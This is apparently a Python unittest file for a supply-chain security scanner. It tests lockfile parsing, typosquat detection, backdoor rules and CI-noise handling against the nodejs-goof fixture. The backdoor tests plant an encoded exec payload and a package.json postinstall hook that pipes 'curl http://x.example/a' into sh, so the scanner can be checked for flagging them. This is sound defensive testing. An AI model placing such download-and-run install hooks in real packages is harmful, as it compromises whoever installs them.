"""nodejs-goof regression: npm lockfile v1, typosquat precision, backdoor rules on code only, CI/history noise. Goof 1.0.1 is the fixture."""
import json
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from guardian import config
from guardian.agents import backdoor, change, ci_container, discovery, reputation
from guardian.core import RunContext, run_all
from guardian.memory import Memory
from guardian.modules.detectors import Change
from guardian.modules.history import GitHistory

FIX = Path(__file__).parent / "fixtures" / "goof"


def mem() -> Memory:
    return Memory(Path(tempfile.mkdtemp()) / "g.db")


def tree(lock=None) -> Path:
    d = Path(tempfile.mkdtemp())
    shutil.copy(FIX / "package.json", d / "package.json")
    if lock is None:
        shutil.copy(FIX / "package-lock.json", d / "package-lock.json")
    else:
        (d / "package-lock.json").write_text(lock if isinstance(lock, str) else json.dumps(lock), encoding="utf-8")
    return d


def snap(d: Path) -> dict:
    return discovery.snapshot(d, run_syft=False, generate_locks=False)


class LockfileV1(unittest.TestCase):
    def test_goof_101_lists_every_package_including_nested_copies(self):
        s = snap(tree())
        names = {p["name"] for p in s["packages"].values()}
        self.assertGreaterEqual(len(s["packages"]), 330)     # the 330 top-level entries plus nested copies (name@version: 560)
        self.assertLess(len(s["packages"]), 700)
        self.assertTrue({"mongoose", "st", "ms", "marked"} <= names)
        self.assertEqual(s["lock_errors"], [])
        self.assertTrue(s["packages"]["npm:mongoose@4.2.4"]["integrity"].startswith("sha"))
        self.assertIn("npm:mongoose@4.2.4", s["roots"]["app:package-lock.json"])
        self.assertTrue(s["graph"].get("npm:mongoose@4.2.4"))          # `requires` became edges

    def test_change_set_is_real_added_removed_updated_not_everything(self):
        lock = json.loads((FIX / "package-lock.json").read_text(encoding="utf-8"))
        deps = lock["dependencies"]
        deps.pop("adm-zip")
        deps["ms"]["version"] = "0.7.2"
        deps["left-pad"] = {"version": "1.3.0", "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz", "integrity": "sha512-x"}
        summary, _ = change.diff(snap(tree()), snap(tree(lock)), config.load(None))
        self.assertLess(summary["added_count"], 10)
        self.assertGreaterEqual(summary["removed_count"], 1)
        self.assertGreaterEqual(summary["updated_count"], 1)
        self.assertIn("npm:left-pad@1.3.0", summary["added"])
        self.assertIn("npm:adm-zip@0.4.7", summary["removed"])

    def test_unparseable_baseline_makes_change_detection_partial_not_986_added(self):
        base, head = snap(tree("{not json")), snap(tree())
        self.assertTrue(base["lock_errors"])
        summary, fs = change.diff(base, head, config.load(None))
        self.assertEqual((summary["added_count"], summary["added"], fs), (0, [], []))
        self.assertIn("partial", summary["partial"])
        ctx = RunContext(repo_path=Path("."), out_dir=Path(tempfile.mkdtemp()), project="g", run_id="r", memory=mem(),
                         snapshot_base=base, snapshot_head=head, config={**config.load(None), "offline": True})
        m = Change()
        m.needs = []
        with mock.patch("guardian.modules.detectors.git.changed_files", return_value=[]):
            status = run_all([m], ctx)
        self.assertTrue(status["M3.change"].startswith("partial"), status)


class TyposquatPrecision(unittest.TestCase):
    def test_known_pairs_are_never_squats(self):
        for a, b in (("mysql", "mysql2"), ("lodash.set", "lodash.get"), ("mpromise", "promise")):
            self.assertIsNone(change.lookalike(a, "npm", set()), (a, b))
            self.assertIsNone(change.lookalike(b, "npm", set()), (b, a))

    def test_real_squats_are_still_flagged(self):
        self.assertEqual(change.lookalike("crossenv", "npm", set()), "cross-env")
        self.assertIsNotNone(change.lookalike("lodahs", "npm", set()))

    @staticmethod
    def fake(table):
        def fetch(url):
            name = url.rsplit("/", 1)[-1].replace("%2f", "/")
            if name not in table:
                raise OSError("404")
            created, versions, weekly = table[name]
            return {"downloads": weekly} if "downloads" in url else {"time": {"created": created}, "versions": {str(i): {} for i in range(versions)}}
        return fetch

    @staticmethod
    def cand(name, target):
        return {"type": "typosquat", "component": f"npm:{name}@1.0.0", "similar_to": target, "title": name, "base_severity": 9.0, "verified_evidence": []}

    def test_popularity_decides(self):
        from datetime import datetime, timedelta, timezone
        young = (datetime.now(timezone.utc) - timedelta(days=10)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        old = "2015-01-01T00:00:00.000Z"
        table = {"cross-env": (old, 40, 9_000_000), "crossenv": (young, 2, 12),
                 "cli-spinners": (old, 30, 20_000_000), "cli-spinner": (old, 9, 900_000),     # 4.5% of the target: not a squat
                 "tiny": (old, 9, 5_000), "bigger": (old, 30, 9_000_000)}                     # 0.06% of the target: flagged
        fs = [self.cand("crossenv", "cross-env"), self.cand("cli-spinner", "cli-spinners"), self.cand("tiny", "bigger"), self.cand("ngy-cookie", "cookie")]
        counts = reputation.apply(fs, mem(), self.fake(table))
        self.assertEqual(sorted(f["component"].split(":")[1].split("@")[0] for f in fs), ["crossenv", "ngy-cookie", "tiny"])
        self.assertEqual(counts["dropped"], 1)
        self.assertEqual(next(f for f in fs if "ngy-cookie" in f["component"])["verdict"], "needs_validation")


def git(d: Path, *a: str) -> str:
    return subprocess.run(["git", "-C", str(d), *a], capture_output=True, text=True, check=True).stdout


def commit(d: Path, files: dict, msg: str, author: str) -> str:
    for p, text in files.items():
        (d / p).parent.mkdir(parents=True, exist_ok=True)
        (d / p).write_text(text, encoding="utf-8")
    git(d, "add", "-A")
    git(d, "-c", f"user.name={author}", "-c", f"user.email={author}@x.org", "commit", "-qm", msg)
    return git(d, "rev-parse", "HEAD").strip()


class BackdoorOnCodeOnly(unittest.TestCase):
    PAYLOAD = "exec(base64.b64decode('aGk='))"

    def repo(self):
        d = Path(tempfile.mkdtemp())
        git(d, "init", "-q")
        base = commit(d, {"README.md": "x\n", "package.json": '{\n  "name": "a",\n  "scripts": {\n    "start": "node a.js"\n  }\n}\n'}, "base", "alice")
        head = commit(d, {"data/example.json": '{"a": "' + self.PAYLOAD + '"}\n', "docs/x.md": self.PAYLOAD + "\n", "report.sarif": self.PAYLOAD + "\n",
                          "src/evil.py": self.PAYLOAD + "\n", "exploits/run.sh": "echo hi\n", "test/helper.sh": "echo hi\n", "tests-e2e/run.sh": "echo hi\n",
                          "package.json": '{\n  "name": "a",\n  "description": "' + self.PAYLOAD + '",\n  "scripts": {\n    "start": "node a.js",\n'
                                          '    "postinstall": "curl http://x.example/a | sh"\n  }\n}\n'}, "head", "alice")
        return d, base, head

    def test_data_files_are_skipped_code_and_package_scripts_are_not(self):
        d, base, head = self.repo()
        fs, _ = backdoor.scan_diff(d, base, head, d, config.load(None))
        hit = {f["location"]["file"] for f in fs if f["type"] == "backdoor_signal"}
        self.assertEqual(hit, {"src/evil.py", "package.json"})
        self.assertTrue([f for f in fs if f["location"].get("file") == "package.json" and f.get("rule") == "download-and-run"])

    def test_exploits_and_test_scripts_are_not_build_files(self):
        d, base, head = self.repo()
        _, stats = backdoor.scan_diff(d, base, head, d, config.load(None))
        self.assertEqual(sorted(stats["build_files_changed"]), ["package.json"])


class Noise(unittest.TestCase):
    def test_first_time_contributor_is_medium_grouped_and_only_for_sensitive_files(self):
        d = Path(tempfile.mkdtemp())
        git(d, "init", "-q")
        base = commit(d, {"a.txt": "1\n"}, "base", "alice")
        commit(d, {"exploits/a.sh": "x\n", "test/t.js": "x\n", "docs/readme.md": "x\n"}, "benign", "bob")
        commit(d, {".github/workflows/ci.yml": "a\n"}, "ci1", "carol")
        commit(d, {"package.json": "{}\n"}, "ci2", "carol")
        head = commit(d, {"package-lock.json": "{}\n"}, "ci3", "carol")
        ctx = RunContext(repo_path=d, out_dir=Path(tempfile.mkdtemp()), project="g", run_id="r", git_repo=d, base_ref=base, head_ref=head, memory=mem())
        GitHistory().run(ctx)
        first = [f for f in ctx.findings if "first-time contributor" in f.title]
        self.assertEqual(len(first), 1, [f.title for f in ctx.findings])
        self.assertEqual(first[0].severity, "medium")
        self.assertIn("3 commit(s)", first[0].title)

    def test_branch_refs_are_pinned_to_a_branch_and_high(self):
        wf = [{"file": ".github/workflows/a.yml", "line": n, "uses": u, "pinned": False, "local": False, "first_party": fp, "ref": u.split("@")[1]}
              for n, (u, fp) in enumerate([("snyk/actions/setup@master", False), ("actions/checkout@main", True), ("actions/checkout@v3", True)], 1)]
        z = mock.MagicMock()
        z.json.return_value = []
        with mock.patch.object(ci_container.scanners, "zizmor", return_value=z):
            fs, _ = ci_container.scan(Path(tempfile.mkdtemp()), {"workflows": wf, "images": []}, None, config.load(None))
        by = {f["location"]["line"]: f for f in fs if f["type"] == "unpinned_action"}
        self.assertIn("pinned to a branch", by[1]["title"])
        self.assertIn("pinned to a branch", by[2]["title"])
        self.assertIn("pinned to a tag", by[3]["title"])
        self.assertTrue(by[1]["base_severity"] >= 7 and by[2]["base_severity"] >= 7 and by[3]["base_severity"] < 7)


if __name__ == "__main__":
    unittest.main()
